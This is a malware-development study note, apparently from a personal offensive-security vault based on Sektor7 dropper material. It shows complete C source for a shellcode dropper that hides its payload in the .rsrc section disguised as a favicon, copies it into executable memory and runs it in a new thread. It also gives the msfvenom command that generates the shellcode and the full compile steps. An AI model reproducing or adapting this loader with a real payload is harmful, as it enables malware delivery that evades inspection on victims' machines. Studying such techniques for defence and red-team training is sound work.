
Code Snippet
```c
/*
 storing payload in .rsrc section
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;  
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// Launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```
#### Retrieving payload from .rsrc algorithm (C-like pseudo-code)

```c
// 1. find the resource in .rsrc section containing payload 
res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA)

// 2. load the resource from .rsrc section
resHandle = LoadResource(NULL, res)

// 3. get a pointer to the loaded resource
payload = (char *) LockResource(resHandle);

// 4. get the size of the resource/payload
payload_len = SizeofResource(NULL, res)
```

---

[**_FindResource()_**](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea) determines the location of a resource with the specified type and name in the specified module (executable file or DLL). This function can be found in the _kernel32.dll_ library.

`FindResource()` function has the following prototype:
```c
HRSRC FindResource(
  HMODULE hModule,   // handle to the module containing the resource. If NULL, the function searches the module used to create the current process
  LPCTSTR lpName,    // name of the resource. Also, this parameter can be MAKEINTRESOURCE(ID), where ID is the integer identifier of the resource
  LPCTSTR lpType     // resource type, ex. RT_BITMAP, RT_ICON, RT_RCDATA, etc. Shellcode will be RT_RCDATA
);
```

**Return value**
If the function succeeds, the return value is a handle to the specified resource's information block. Otherwise, the return value is `NULL`.

---

[**_LoadResource()_**](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource) is used to load a resource from the module's resource section. This function can be found in the _kernel32.dll_ library.

`LoadResource()` function has the following prototype:

```c
HGLOBAL LoadResource(
  HMODULE hModule,    // handle to the module whose executable file contains the resource if null searches the module used to create the current process
  HRSRC   hResInfo    // handle to the resource to be loaded (returned by FindResource() function)
);
```

**Return value**
If the function succeeds, the return value is a handle to the data associated with the resource. Otherwise, the return value is `NULL`.

---

[**_LockResource()_**](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource) is used to obtain a pointer to the data associated with a resource. This function can be found in the _kernel32.dll_ library.

`LockResource()` function has the following prototype:
```c
LPVOID LockResource(
  HGLOBAL hResData    // handle to the resource to be accessed (from LoadResource() function)
);
```

**Return value**

If the loaded resource is available, the return value is a pointer to the first byte of the resource; otherwise, it is `NULL`.

> `LockResource()` needs to be casted as a `char` because it returning a Long Pointer Void which means "a generic pointer to some memory, but I don’t know (or care) what type of data it points to.”

---

[**_SizeofResource()_**](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource) is used to retrieve the size (in bytes) of a resource. This function can be found in the _kernel32.dll_ library.

`SizeofResource()` function has the following prototype:
```c
DWORD SizeofResource(
  HMODULE hModule,    // handle to the module whose executable file contains the resource
  HRSRC   hResInfo    // handle to the resource to be loaded (returned by FindResource() function)
);
```

**Return value**
If the function succeeds, the return value is the number of bytes in the resource. Otherwise, the return value is zero.


### REST OF CODE EXPLAINED [HERE](obsidian://open?vault=Offensive%20Security&file=root%2FMalware%20Development%2FSektor7%2FDroppers%2FPayload%20held%20in%20.text)

---
#### Resources header file

Must be included in the code for reference - `resources.h`
```
#define FAVICON_ICO 100
```

---
#### Resource script

Saying FAVICON_ICO is the RCDATA type and points to the file calc.ico
```
#include "resources.h"

FAVICON_ICO RCDATA notepad.ico
```

---

#### Bin file creation

```bash
msfvenom -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread -f raw -o notepad.ico
```

---

#### Compiling

```powershell
rc.exe resources.rc
cvtres.exe /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o
```

In Windows, `rc.exe` and `cvtres.exe` are two command-line tools used in the process of building Windows applications. They are part of the Microsoft Visual Studio toolset.

1. [**_Resource Compiler_**](https://learn.microsoft.com/en-us/windows/win32/menurc/resource-compiler): `rc.exe` is a special resource compiler in Windows. It is used to compile resource script files (with a _.rc_ extension) into binary resource files (with a _.res_ extension). Resource script files contain resources such as icons, bitmaps, dialog boxes, menus, strings, version information, etc., that are used in Windows applications.
    
2. **_Resource Converter_**: `cvtres.exe` is used to convert resource files from an older format (usually _.res_ files) to the newer _.coff_ format (Microsoft's Common Object File). This conversion is necessary for compatibility with modern development tools and linkers. `cvtres.exe` is typically invoked during the build process after resource files are compiled with `rc.exe`.